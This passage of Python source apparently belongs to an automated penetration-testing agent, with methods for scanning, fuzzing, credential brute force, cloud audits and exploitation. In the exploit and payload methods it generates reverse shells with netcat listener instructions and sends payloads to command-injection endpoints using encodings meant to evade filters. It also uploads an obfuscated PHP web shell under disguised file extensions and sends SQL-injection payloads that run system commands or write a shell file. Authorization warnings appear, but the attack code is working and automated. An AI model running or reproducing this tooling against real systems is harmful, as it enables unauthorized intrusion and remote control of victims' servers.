            return {"error": f"Web pentest failed: {str(e)}"}
    
    async def _run_api_test(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Test API security"""
        result = await api_probe(self.config.target)
        
        if result.get("vulnerabilities"):
            for vuln in result["vulnerabilities"]:
                finding = Finding(
                    timestamp=datetime.now().isoformat(),
                    tool="api_test",
                    severity=vuln.get("severity", "medium"),
                    category="api_security",
                    description=vuln.get("description", "API vulnerability"),
                    details=vuln,
                    exploitation_potential="medium",
                    recommended_action="Review API security controls"
                )
                self.findings.append(finding)
        
        return result
    
    async def _run_takeover_scan(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Check for subdomain takeover"""
        result = await takeover_scan(self.config.target)
        
        if result.get("vulnerable"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="takeover_scan",
                severity="high",
                category="dns_misconfiguration",
                description="Subdomain takeover vulnerability detected",
                details=result,
                exploitation_potential="high",
                recommended_action="Remove dangling DNS records"
            )
            self.findings.append(finding)
        
        return result
    
    async def _run_tech_detect(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Detect technologies"""
        result = await detect_tech(self.config.target)
        
        if result.get("technologies"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="tech_detect",
                severity="info",
                category="reconnaissance",
                description=f"Technologies: {', '.join(result['technologies'][:5])}",
                details=result,
                exploitation_potential="low",
                recommended_action="Research known vulnerabilities for detected technologies"
            )
            self.findings.append(finding)
        
        return result
    
    async def _run_recon(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run reconnaissance"""
        result = await recon(self.config.target)
        
        if result.get("subdomains"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="recon",
                severity="info",
                category="reconnaissance",
                description=f"Found {len(result['subdomains'])} subdomains",
                details=result,
                exploitation_potential="low",
                recommended_action="Scan discovered subdomains"
            )
            self.findings.append(finding)
        
        return result
    
    async def _run_execute_command(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute system command on attacker machine (cross-platform)"""
        import subprocess
        import platform as plat
        
        cmd = params.get("cmd")
        target_platform = params.get("platform", plat.system().lower())
        timeout = params.get("timeout", 30)
        background = params.get("background", False)
        
        if not cmd:
            return {"error": "No command specified"}
        
        # Detect current platform
        current_platform = plat.system().lower()
        
        # Platform validation
        if target_platform == "windows" and current_platform != "windows":
            return {"error": f"Cannot execute Windows command on {current_platform}"}
        elif target_platform in ["linux", "macos", "darwin"] and current_platform == "windows":
            return {"error": f"Cannot execute Unix command on {current_platform}"}
        
        # Prepare command based on platform
        if current_platform == "windows":
            # Execute via PowerShell
            full_cmd = ["powershell", "-NoProfile", "-Command", cmd]
        else:
            # Execute via bash
            full_cmd = ["bash", "-c", cmd]
        
        try:
            if background:
                # Start background process
                process = subprocess.Popen(
                    full_cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                result_data = {
                    "status": "started",
                    "pid": process.pid,
                    "command": cmd,
                    "platform": current_platform,
                    "message": f"Background process started (PID: {process.pid})"
                }
            else:
                # Execute and wait for completion
                result = subprocess.run(
                    full_cmd,
                    capture_output=True,
                    text=True,
                    timeout=timeout
                )
                
                result_data = {
                    "status": "completed",
                    "exit_code": result.returncode,
                    "stdout": result.stdout.strip(),
                    "stderr": result.stderr.strip(),
                    "command": cmd,
                    "platform": current_platform
                }
            
            # Log as finding
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="execute_command",
                severity="info",
                category="command_execution",
                description=f"Executed command on {current_platform}: {cmd[:100]}",
                details=result_data,
                exploitation_potential="low",
                recommended_action="Review command output"
            )
            self.findings.append(finding)
            
            return result_data
            
        except subprocess.TimeoutExpired:
            return {
                "error": f"Command timed out after {timeout} seconds",
                "command": cmd,
                "platform": current_platform
            }
        except Exception as e:
            return {
                "error": f"Command execution failed: {str(e)}",
                "command": cmd,
                "platform": current_platform
            }
    
    async def _run_payload_generate(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Generate exploitation payload tailored to detected OS"""
        if self.config.risk_tolerance != RiskTolerance.HIGH:
            return {"error": "Payload generation requires HIGH risk tolerance"}
        
        generator = PayloadGenerator()
        
        lhost = params.get("lhost", "attacker-ip")
        lport = params.get("lport", 4444)
        shell_type = params.get("shell", None)
        
        # Auto-detect OS from previous findings if shell type not specified
        if not shell_type:
            detected_os = self._detect_target_os()
            
            # Map OS to appropriate shell type
            if "windows" in detected_os.lower():
                shell_type = "powershell"
            elif "linux" in detected_os.lower() or "unix" in detected_os.lower():
                shell_type = "bash"
            else:
                # Default based on common ports detected
                open_ports = self._get_detected_ports()
                if 3389 in open_ports or 445 in open_ports or 135 in open_ports:
                    shell_type = "powershell"  # Windows indicators
                elif 22 in open_ports:
                    shell_type = "bash"  # Linux/Unix indicators
                else:
                    shell_type = "python"  # Cross-platform fallback
        
        payload_data = generator.generate_reverse_shell(lhost, lport, shell_type)
        payload_code = payload_data.get("payload", "")
        
        finding = Finding(
            timestamp=datetime.now().isoformat(),
            tool="payload_generate",
            severity="critical",
            category="exploitation",
            description=f"Generated {shell_type} reverse shell (OS: {self._detect_target_os()})",
            details={
                "payload": payload_code,
                "lhost": lhost,
                "lport": lport,
                "shell_type": shell_type,
                "detected_os": self._detect_target_os(),
                "description": payload_data.get("description", "")
            },
            exploitation_potential="critical",
            recommended_action="Use only with explicit authorization"
        )
        self.findings.append(finding)
        
        return {
            "payload": payload_code,
            "usage_instructions": f"1. Start listener: nc -lvnp {lport}\n2. Execute payload on target\n3. Shell should connect to {lhost}:{lport}",
            "shell_type": shell_type,
            "detected_os": self._detect_target_os(),
            "lhost": lhost,
            "lport": lport
        }
    
    async def _run_udp_scan(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run UDP port scan"""
        ports = params.get("ports", [53, 67, 68, 69, 123, 135, 137, 138, 161, 500])
        result = await async_udp_scan(self.config.target, ports, concurrency=50, timeout=2.0)
        
        open_ports = [r for r in result if r.get("state") == "open"]
        if open_ports:
            for port_info in open_ports:
                finding = Finding(
                    timestamp=datetime.now().isoformat(),
                    tool="udp_scan",
                    severity="medium",
                    category="network",
                    description=f"Open UDP port {port_info['port']}: {port_info.get('service', 'unknown')}",
                    details=port_info,
                    exploitation_potential="medium",
                    recommended_action="Enumerate UDP services for vulnerabilities"
                )
                self.findings.append(finding)
        
        return {"open_ports": len(open_ports), "details": result}
    
    async def _run_service_enumeration(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Enumerate services on discovered open ports with version detection and banner grabbing"""
        # Get previously discovered open ports from findings
        port_findings = [f for f in self.findings if f.tool in ["port_scan", "syn_scan"] and "open" in f.description.lower()]
        
        if not port_findings:
            print("  [INFO] No open ports found yet. Running port scan first...")
            # Run port scan if no ports discovered yet
            await self._run_port_scan({"ports": "common"})
            port_findings = [f for f in self.findings if f.tool in ["port_scan", "syn_scan"] and "open" in f.description.lower()]
        
        discovered_ports = []
        for finding in port_findings:
            # Extract port number from description or details
            port = finding.details.get("port") if isinstance(finding.details, dict) else None
            if port:
                discovered_ports.append(port)
        
        if not discovered_ports:
            print("  [WARN] No open ports to enumerate")
            return {"services_enumerated": 0, "services": []}
        
        print(f"  [INFO] Enumerating services on {len(discovered_ports)} open ports...")
        
        # Service enumeration via banner grabbing
        import socket
        services_found = []
        
        for port in discovered_ports[:20]:  # Limit to first 20 ports
            try:
                # Attempt banner grabbing
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target_host, port))
                
                # Send probe data
                probes = {
                    80: b"GET / HTTP/1.0\r\n\r\n",
                    443: b"GET / HTTP/1.0\r\n\r\n",
                    21: b"USER anonymous\r\n",
                    22: b"\r\n",
                    25: b"HELO test\r\n",
                    3306: b"\r\n",
                }
                
                probe = probes.get(port, b"\r\n")
                sock.send(probe)
                
                # Receive banner
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                sock.close()
                
                if banner:
                    # Parse service information from banner
                    service_info = {
                        "port": port,
                        "banner": banner[:200],  # Truncate long banners
                        "service": self._identify_service(port, banner),
                        "version": self._extract_version(banner)
                    }
                    services_found.append(service_info)
                    
                    # Create finding for service
                    severity = "high" if port in [21, 22, 23, 3389] else "medium"  # SSH, FTP, Telnet, RDP are high interest
                    finding = Finding(
                        timestamp=datetime.now().isoformat(),
                        tool="service_enum",
                        severity=severity,
                        category="service_enumeration",
                        description=f"Service: {service_info['service']} v{service_info['version']} on port {port}",
                        details=service_info,
                        exploitation_potential=severity,
                        recommended_action=f"Test {service_info['service']} for known CVEs and default credentials"
                    )
                    self.findings.append(finding)
                    print(f"  [FOUND] Port {port}: {service_info['service']} {service_info['version']}")
                    
            except Exception as e:
                # Silent fail for closed/filtered ports
                pass
        
        return {"services_enumerated": len(services_found), "services": services_found}
    
    def _identify_service(self, port: int, banner: str) -> str:
        """Identify service from port and banner"""
        banner_lower = banner.lower()
        
        # Common service signatures
        if "ssh" in banner_lower:
            return "SSH"
        elif "ftp" in banner_lower:
            return "FTP"
        elif "http" in banner_lower or "html" in banner_lower:
            return "HTTP"
        elif "smtp" in banner_lower or "mail" in banner_lower:
            return "SMTP"
        elif "mysql" in banner_lower:
            return "MySQL"
        elif "postgres" in banner_lower:
            return "PostgreSQL"
        elif "microsoft" in banner_lower and "sql" in banner_lower:
            return "MSSQL"
        elif "apache" in banner_lower:
            return "Apache"
        elif "nginx" in banner_lower:
            return "Nginx"
        elif "iis" in banner_lower:
            return "IIS"
        elif "telnet" in banner_lower:
            return "Telnet"
        
        # Fallback to common port associations
        port_services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS",
            445: "SMB", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
            5900: "VNC", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt"
        }
        return port_services.get(port, "Unknown")
    
    def _extract_version(self, banner: str) -> str:
        """Extract version from banner"""
        import re
        # Look for version patterns like "2.4.52", "1.18.0", etc.
        version_match = re.search(r'(\d+\.[\d\.]+\d+)', banner)
        if version_match:
            return version_match.group(1)
        return "unknown"
    
    async def _run_advanced_scan(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run advanced scan with service detection and enumeration"""
        ports = params.get("ports", [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080])
        
        # Parse ports if string
        if isinstance(ports, str):
            try:
                ports = [int(p.strip()) for p in ports.split(',') if p.strip().isdigit()]
                print(f"  [INFO] Parsed port string: {ports}")
            except:
                ports = [80, 443, 8080]  # Fallback
        
        scan_type_raw = params.get("scan_type", "fin")  # fin, xmas, null, ack, service_enum
        
        # If service enumeration requested, use previously discovered ports
        if scan_type_raw.lower() == "service_enum":
            return await self._run_service_enumeration(params)
        
        scan_type_raw = params.get("scan_type", "fin")  # fin, xmas, null, ack (NOT syn - that's basic)
        
        # Validate and correct scan type
        valid_advanced_scan_types = ["fin", "xmas", "null", "ack"]
        if scan_type_raw.lower() not in valid_advanced_scan_types:
            # Fall back to fin scan
            scan_type = "fin"
        else:
            scan_type = scan_type_raw.lower()
        
        try:
            result_list = await async_advanced_scan(
                self.target_host,
                ports,
                scan_type=scan_type,
                concurrency=100,
                timeout=2.0
            )
        except PermissionError:
            # Fallback to TCP scan if advanced scan requires root
            try:
                result_list = await async_port_scan(self.target_host, ports=ports, concurrency=100)
                print(f"  [INFO] Advanced scan requires root. Using TCP fallback.")
            except Exception as e:
                return {"error": f"Advanced scan failed and TCP fallback failed: {str(e)}", "open_ports": 0}
        
        # Process scan results
        open_ports = [r for r in result_list if r.get("state") in ["open", "filtered"]]
        if open_ports:
            for svc in open_ports:
                severity = "high" if any(k in str(svc).lower() for k in ["exploit", "vulnerable"]) else "medium"
                finding = Finding(
                    timestamp=datetime.now().isoformat(),
                    tool="advanced_scan",
                    severity=severity,
                    category="service_detection",
                    description=f"Service detected: {svc.get('service', 'unknown')} on port {svc.get('port')}",
                    details=svc,
                    exploitation_potential=severity,
                    recommended_action="Test service for known vulnerabilities"
                )
                self.findings.append(finding)
        
        return {"open_ports": len(open_ports), "details": result_list}
    
    async def _run_dirbuster(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run directory busting"""
        target_url = params.get("url", f"https://{self.config.target}")
        result = await dirbust_scan(target_url, concurrency=50, https=True)
        
        if result.get("found"):
            for item in result["found"][:20]:  # Top 20 findings
                finding = Finding(
                    timestamp=datetime.now().isoformat(),
                    tool="dirbuster",
                    severity="info",
                    category="web_enumeration",
                    description=f"Discovered: {item['path']} (Status: {item['status']})",
                    details=item,
                    exploitation_potential="low",
                    recommended_action="Analyze discovered endpoints for sensitive data"
                )
                self.findings.append(finding)
        
        return result
    
    async def _run_crawler(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run web crawler"""
        target_url = params.get("url", f"https://{self.config.target}")
        result = await crawl(target_url, max_pages=50)
        
        if result.get("secrets"):
            for secret in result["secrets"]:
                finding = Finding(
                    timestamp=datetime.now().isoformat(),
                    tool="crawler",
                    severity="high",
                    category="information_disclosure",
                    description=f"Secret found: {secret.get('type')} in {secret.get('location')}",
                    details=secret,
                    exploitation_potential="high",
                    recommended_action="Secure exposed credentials immediately"
                )
                self.findings.append(finding)
        
        return result
    
    async def _run_fuzzer(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run web fuzzer"""
        if self.config.risk_tolerance == RiskTolerance.LOW:
            return {"error": "Fuzzing requires MEDIUM or HIGH risk tolerance"}
        
        target_url = params.get("url", f"https://{self.config.target}")
        wordlist = params.get("wordlist", ["'", '"', "<", ">", "../", "..\\", "{{7*7}}", "${7*7}"])
        fuzzer = AdvancedFuzzer(target_url, wordlist=wordlist, timeout=10.0)
        
        # Fuzz a common parameter
        param_name = params.get("param", "id")
        vulnerabilities = await fuzzer.fuzz_parameters(param_name)
        
        for vuln in vulnerabilities:
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="fuzzer",
                severity="high",
                category="web_vulnerability",
                description=f"Fuzzing vulnerability in {vuln.url}",
                details={
                    "url": vuln.url,
                    "status": vuln.status_code,
                    "length": vuln.content_length,
                    "payload": vuln.payload
                },
                exploitation_potential="high",
                recommended_action="Validate and sanitize all user inputs"
            )
            self.findings.append(finding)
        
        return {"vulnerabilities_found": len(vulnerabilities), "details": vulnerabilities}
    
    async def _run_bruteforce(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run authentication bruteforce"""
        if self.config.risk_tolerance != RiskTolerance.HIGH:
            return {"error": "Bruteforce requires HIGH risk tolerance"}
        
        target_url = params.get("url", f"https://{self.config.target}")
        auth_type = params.get("auth_type", "basic")  # basic, form, json
        username = params.get("username", "admin")
        
        # Use common credentials only
        passwords = ["admin", "password", "123456", "root", "admin123"]
        
        bruteforcer = AuthBruteForcer(target_url, concurrency=5)
        
        # Test based on auth type
        try:
            if auth_type == "basic":
                results = await bruteforcer.brute_force_basic_auth([username], passwords)
            elif auth_type == "form":
                username_field = params.get("username_field", "username")
                password_field = params.get("password_field", "password")
                results = await bruteforcer.brute_force_form([username], passwords, username_field=username_field, password_field=password_field)
            else:  # json
                username_field = params.get("username_field", "username")
                password_field = params.get("password_field", "password")
                results = await bruteforcer.brute_force_json_api([username], passwords, username_field=username_field, password_field=password_field)
            
            # Check for successful authentication
            successful = [r for r in results if r.success]
            if successful:
                for success_result in successful:
                    finding = Finding(
                        timestamp=datetime.now().isoformat(),
                        tool="bruteforce",
                        severity="critical",
                        category="authentication",
                        description=f"Weak credentials: {success_result.username}:{success_result.password}",
                        details={"username": success_result.username, "password": success_result.password},
                        exploitation_potential="critical",
                        recommended_action="Enforce strong password policy and account lockout"
                    )
                    self.findings.append(finding)
            
            return {"total_attempts": len(results), "successful": len(successful)}
        except Exception as e:
            return {"error": str(e)}
        
        if results.get("success"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="bruteforce",
                severity="critical",
                category="authentication",
                description=f"Weak credentials: {username}:{results['password']}",
                details=results,
                exploitation_potential="critical",
                recommended_action="Enforce strong password policy and account lockout"
            )
            self.findings.append(finding)
        
        return results
    
    async def _run_nuclei(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run Nuclei vulnerability scanner - rate-limit-free template-based scanning"""
        try:
            scanner = NucleiScanner()
            # Build target URL properly
            target = self.config.target
            if not target.startswith(("http://", "https://")):
                # Check if port is specified
                if ":" in target:
                    target = f"http://{target}"
                else:
                    target = f"http://{target}:8080"
            
            print(f"  [NUCLEI] Scanning {target} with 8900+ templates...")
            
            # Nuclei scan is sync, run in thread
            findings = await asyncio.to_thread(
                scanner.scan,
                target,
                tags=params.get("tags", ["cve", "default-login", "exposure", "owasp", "misconfig"]),
                severity=params.get("severity", ["critical", "high", "medium"])
            )
            result = {"findings": findings, "scan_count": len(findings)}
            
            if findings:
                print(f"  [NUCLEI] Found {len(findings)} vulnerabilities")
                for vuln in findings:
                    # Extract credentials from default-login findings
                    extracted_data = vuln.get("extracted_results", [])
                    vuln_info = vuln.get("info", {})
                    severity_map = {"critical": "critical", "high": "high", "medium": "medium", "low": "low", "info": "info"}
                    severity = severity_map.get(vuln_info.get("severity", "medium").lower(), "medium")
                    
                    # Build description with credentials if available
                    description = vuln_info.get("name", "Nuclei finding")
                    if "default-login" in vuln.get("template_id", ""):
                        # Parse extracted credentials
                        if extracted_data:
                            creds = ", ".join(extracted_data)
                            description = f"üîë Default Login Found: {description} [{creds}]"
                            severity = "critical"  # Bump severity for valid creds
                    
                    finding = Finding(
                        timestamp=datetime.now().isoformat(),
                        tool="nuclei",
                        severity=severity,
                        category="vulnerability",
                        description=description,
                        details={
                            "template_id": vuln.get("template_id"),
                            "name": vuln_info.get("name"),
                            "severity": vuln_info.get("severity"),
                            "matched_at": vuln.get("matched_at"),
                            "extracted": extracted_data,
                            "curl": vuln.get("curl_command"),
                            "tags": vuln_info.get("tags", [])
                        },
                        exploitation_potential=severity,
                        recommended_action="Apply security patches and rotate compromised credentials" if "default-login" in vuln.get("template_id", "") else "Apply security patches"
                    )
                    self.findings.append(finding)
            else:
                print(f"  [NUCLEI] No vulnerabilities found (clean scan)")
            
            return result
        except FileNotFoundError as e:
            return {"error": f"Nuclei not installed. Install from: https://github.com/projectdiscovery/nuclei"}
        except Exception as e:
            return {"error": f"Nuclei scan failed: {str(e)}"}
    
    async def _run_cloud_audit(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Audit cloud storage"""
        bucket_name = params.get("bucket", self.config.target.replace(".", "-"))
        result = await cloud_audit(bucket_name, providers=["aws", "azure", "gcp"])
        
        if result.get("vulnerable"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="cloud_audit",
                severity="critical",
                category="cloud_misconfiguration",
                description=f"Public cloud storage: {result.get('provider')}",
                details=result,
                exploitation_potential="critical",
                recommended_action="Restrict bucket access with proper IAM policies"
            )
            self.findings.append(finding)
        
        return result
    
    async def _run_k8s_audit(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Audit Kubernetes API"""
        api_base = params.get("api_base", f"https://{self.config.target}:6443")
        result = await k8s_audit(api_base, verify_cert=False)
        
        if result.get("exposed_endpoints"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="k8s_audit",
                severity="critical",
                category="kubernetes",
                description="Unauthenticated Kubernetes API access",
                details=result,
                exploitation_potential="critical",
                recommended_action="Enable RBAC and authentication"
            )
            self.findings.append(finding)
        
        return result
    
    async def _run_container_audit(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Audit container registry"""
        registry = params.get("registry", f"{self.config.target}:5000")
        result = await container_audit(registry)
        
        if result.get("anonymous_access"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="container_audit",
                severity="high",
                category="container_security",
                description="Anonymous container registry access",
                details=result,
                exploitation_potential="high",
                recommended_action="Enable authentication and TLS"
            )
            self.findings.append(finding)
        
        return result
    
    async def _run_exploit(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Attempt exploitation based on discovered vulnerabilities"""
        if self.config.risk_tolerance != RiskTolerance.HIGH:
            return {"error": "Exploitation requires HIGH risk tolerance and explicit authorization"}
        
        # Find exploitable vulnerabilities
        exploitable = [f for f in self.findings if f.exploitation_potential in ["critical", "high"]]
        
        if not exploitable:
            return {"message": "No exploitable vulnerabilities found yet"}
        
        # Prioritize RCE, command injection, file upload
        rce_vulns = [f for f in exploitable if any(
            keyword in f.description.lower() 
            for keyword in ["rce", "command injection", "file upload", "sql injection"]
        )]
        
        if rce_vulns:
            target_vuln = rce_vulns[0]
            
            # Generate appropriate payload
            generator = PayloadGenerator()
            lhost = params.get("lhost", "ATTACKER-IP-REQUIRED")
            lport = params.get("lport", 4444)
            
            # Determine OS from fingerprinting
            os_findings = [f for f in self.findings if f.tool == "os_fingerprint"]
            os_type = "linux"
            if os_findings:
                os_match = os_findings[0].details.get("os_match", "").lower()
                if "windows" in os_match:
                    os_type = "windows"
            
            shell_type = "powershell" if os_type == "windows" else "bash"
            payload_data = generator.generate_reverse_shell(lhost, lport, shell_type)
            payload_code = payload_data.get("payload", "")
            
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="exploit_vuln",
                severity="critical",
                category="exploitation",
                description=f"Exploitation payload generated for {target_vuln.description}",
                details={
                    "target_vulnerability": target_vuln.description,
                    "payload": payload_code,
                    "lhost": lhost,
                    "lport": lport,
                    "shell_type": shell_type,
                    "listener_command": f"nc -lvnp {lport}",
                    "usage_instructions": f"1. Start listener: nc -lvnp {lport}\n2. Execute payload on target\n3. Wait for shell connection"
                },
                exploitation_potential="critical",
                recommended_action=f"Set up listener: nc -lvnp {lport}, then inject payload into vulnerable parameter"
            )
            self.findings.append(finding)
            
            # üî• AGGRESSIVE MODE: Actually attempt exploitation
            exploitation_result = {
                "exploitation_ready": True,
                "target_vulnerability": target_vuln.description,
                "payload": payload_code,
                "shell_type": shell_type,
                "listener_setup": f"nc -lvnp {lport}",
                "warning": "‚ö†Ô∏è ONLY USE WITH EXPLICIT WRITTEN AUTHORIZATION",
                "exploitation_attempted": False,
                "shell_obtained": False,
                "instructions": [
                    f"1. On your machine, run: nc -lvnp {lport}",
                    f"2. Payload will attempt connection to {lhost}:{lport}",
                    "3. Monitor listener for incoming shell"
                ]
            }
            
            # Attempt actual exploitation based on vulnerability type
            if "command injection" in target_vuln.description.lower() or "rce" in target_vuln.description.lower():
                # Attempt to execute payload via the vulnerability
                try:
                    # Extract vulnerable endpoint from findings
                    vuln_url = target_vuln.details.get("url", f"http://{self.config.target}")
                    vuln_param = target_vuln.details.get("parameter", "cmd")
                    vuln_method = target_vuln.details.get("method", "GET")
                    
                    # Try multiple payload encoding methods for evasion
                    import urllib.parse
                    import base64
                    
                    payloads_to_try = [
                        payload_code,  # Raw payload
                        urllib.parse.quote(payload_code),  # URL encoded
                        base64.b64encode(payload_code.encode()).decode(),  # Base64 encoded
                        payload_code.replace(" ", "${IFS}"),  # Shell variable substitution
                    ]
                    
                    exploitation_result["exploitation_attempted"] = True
                    exploitation_result["attempts"] = []
                    
                    async with httpx.AsyncClient(timeout=30, verify=False, follow_redirects=True) as client:
                        for i, encoded_payload in enumerate(payloads_to_try, 1):
                            try:
                                if vuln_method.upper() == "GET":
                                    exploit_url = f"{vuln_url}?{vuln_param}={encoded_payload}"
                                    resp = await client.get(exploit_url)
                                else:
                                    resp = await client.post(vuln_url, data={vuln_param: encoded_payload})
                                
                                attempt_result = {
                                    "method": vuln_method,
                                    "encoding": ["raw", "url", "base64", "shell_var"][i-1],
                                    "status": resp.status_code,
                                    "success": resp.status_code in [200, 201, 202]
                                }
                                exploitation_result["attempts"].append(attempt_result)
                                
                                if resp.status_code in [200, 201, 202]:
                                    exploitation_result["message"] = f"üî• PAYLOAD DELIVERED! Encoding: {attempt_result['encoding']}. Check listener: nc -lvnp {lport}"
                                    exploitation_result["shell_obtained"] = "PAYLOAD_EXECUTED - Verify shell connection"
                                    exploitation_result["successful_payload"] = encoded_payload
                                    break
                                    
                            except Exception as attempt_error:
                                exploitation_result["attempts"].append({
                                    "encoding": ["raw", "url", "base64", "shell_var"][i-1],
                                    "error": str(attempt_error)
                                })
                        
                except Exception as e:
                    exploitation_result["exploitation_error"] = str(e)
            
            elif "file upload" in target_vuln.description.lower():
                # Attempt to upload web shell
                try:
                    vuln_url = target_vuln.details.get("url", f"http://{self.config.target}/upload")
                    
                    # Generate web shell instead
                    web_shell_data = generator.generate_web_shell("php", obfuscate=True)
                    web_shell_code = web_shell_data.get("payload", "")
                    
                    # Try multiple file extensions for evasion
                    file_extensions = ["php", "php5", "phtml", "phar", "jpg.php", "php.jpg"]
                    
                    exploitation_result["exploitation_attempted"] = True
                    exploitation_result["upload_attempts"] = []
                    
                    # Attempt upload with different extensions
                    async with httpx.AsyncClient(timeout=30, verify=False, follow_redirects=True) as client:
                        shell_uploaded = False
                        
                        for ext in file_extensions:
                            try:
                                filename = f"shell.{ext}"
                                # Mimic image upload for evasion
                                content_type = "image/jpeg" if "jpg" in ext else "application/x-php"
                                files = {"file": (filename, web_shell_code, content_type)}
                                resp = await client.post(vuln_url, files=files)
                                
                                upload_attempt = {
                                    "filename": filename,
                                    "extension": ext,
                                    "status": resp.status_code,
                                    "success": resp.status_code in [200, 201, 202]
                                }
                                exploitation_result["upload_attempts"].append(upload_attempt)
                                
                                if resp.status_code in [200, 201, 202]:
                                    # Try to access uploaded shell at common locations
                                    shell_paths = [
                                        f"http://{self.config.target}/uploads/{filename}",
                                        f"http://{self.config.target}/files/{filename}",
                                        f"http://{self.config.target}/{filename}",
                                        f"http://{self.config.target}/upload/{filename}"
                                    ]
                                    
                                    for shell_url in shell_paths:
                                        try:
                                            # Test shell with simple command
                                            test_resp = await client.get(f"{shell_url}?cmd=whoami", timeout=5)
                                            if test_resp.status_code == 200 and len(test_resp.text) > 0:
                                                exploitation_result["shell_obtained"] = "WEB_SHELL_ACTIVE"
                                                exploitation_result["webshell_url"] = shell_url
                                                exploitation_result["message"] = f"üî• WEB SHELL UPLOADED AND VERIFIED! Access: {shell_url}?cmd=<command>"
                                                exploitation_result["test_output"] = test_resp.text[:200]
                                                shell_uploaded = True
                                                break
                                        except:
                                            continue
                                    
                                    if shell_uploaded:
                                        break
                                        
                            except Exception as attempt_error:
                                exploitation_result["upload_attempts"].append({
                                    "filename": f"shell.{ext}",
                                    "error": str(attempt_error)
                                })
                        
                except Exception as e:
                    exploitation_result["exploitation_error"] = str(e)
            
            elif "sql injection" in target_vuln.description.lower():
                # Attempt SQL injection exploitation for command execution
                try:
                    vuln_url = target_vuln.details.get("url", f"http://{self.config.target}")
                    vuln_param = target_vuln.details.get("parameter", "id")
                    vuln_method = target_vuln.details.get("method", "GET")
                    
                    exploitation_result["exploitation_attempted"] = True
                    exploitation_result["sqli_attempts"] = []
                    
                    # Try multiple SQLi-based RCE techniques
                    sqli_payloads = []
                    
                    if os_type == "windows":
                        # MSSQL xp_cmdshell
                        sqli_payloads.extend([
                            f"1; EXEC xp_cmdshell '{payload_code}';--",
                            f"1'; EXEC master..xp_cmdshell '{payload_code}'--",
                            f"1' UNION SELECT NULL; EXEC xp_cmdshell '{payload_code}'--"
                        ])
                    else:
                        # MySQL/PostgreSQL sys_exec, INTO OUTFILE
                        sqli_payloads.extend([
                            f"1' UNION SELECT sys_exec('{payload_code}')--",
                            f"1'; SELECT sys_exec('{payload_code}');--",
                            f"1' UNION SELECT '<?php system(\"{payload_code}\"); ?>' INTO OUTFILE '/var/www/html/shell.php'--"
                        ])
                    
                    async with httpx.AsyncClient(timeout=30, verify=False, follow_redirects=True) as client:
                        for i, sqli_payload in enumerate(sqli_payloads, 1):
                            try:
                                encoded_sqli = urllib.parse.quote(sqli_payload)
                                
                                if vuln_method.upper() == "GET":
                                    exploit_url = f"{vuln_url}?{vuln_param}={encoded_sqli}"
                                    resp = await client.get(exploit_url)
                                else:
                                    resp = await client.post(vuln_url, data={vuln_param: sqli_payload})
                                
                                sqli_attempt = {
                                    "attempt": i,
                                    "method": vuln_method,
                                    "status": resp.status_code,
                                    "response_length": len(resp.text),
                                    "success": resp.status_code in [200, 201, 202] and "error" not in resp.text.lower()
                                }
                                exploitation_result["sqli_attempts"].append(sqli_attempt)
                                
                                if sqli_attempt["success"]:
                                    exploitation_result["message"] = f"üî• SQLi RCE EXECUTED! Attempt #{i}. Check listener: nc -lvnp {lport}"
                                    exploitation_result["shell_obtained"] = "SQLI_RCE_ATTEMPTED - Verify shell connection"
                                    exploitation_result["successful_payload"] = sqli_payload
                                    break
                                    
                            except Exception as attempt_error:
                                exploitation_result["sqli_attempts"].append({
                                    "attempt": i,
                                    "error": str(attempt_error)
                                })
                        
                except Exception as e:
                    exploitation_result["exploitation_error"] = str(e)
            
            return exploitation_result
        
        return {"message": "Analyzing exploitation paths..."}
    
    def _detect_target_os(self) -> str:
        """Detect target OS from previous findings"""
        # Check OS fingerprint findings
        os_findings = [f for f in self.findings if f.tool == "os_fingerprint"]
        if os_findings:
            os_match = os_findings[0].details.get("os_match", "unknown")
            return os_match
        
        # Check port scan findings for OS indicators
        open_ports = self._get_detected_ports()
        
        # Windows indicators
        if any(port in open_ports for port in [3389, 445, 135, 139, 5985, 5986]):
            return "Windows"
        
        # Linux/Unix indicators
        if 22 in open_ports:
            return "Linux/Unix"
        
        # Web server (multi-platform)
        if 80 in open_ports or 443 in open_ports:
            # Check for technology stack
            tech_findings = [f for f in self.findings if f.tool == "tech_detect"]
            if tech_findings:
                tech = tech_findings[0].details.get("server", "").lower()
                if "iis" in tech or "microsoft" in tech:
                    return "Windows"
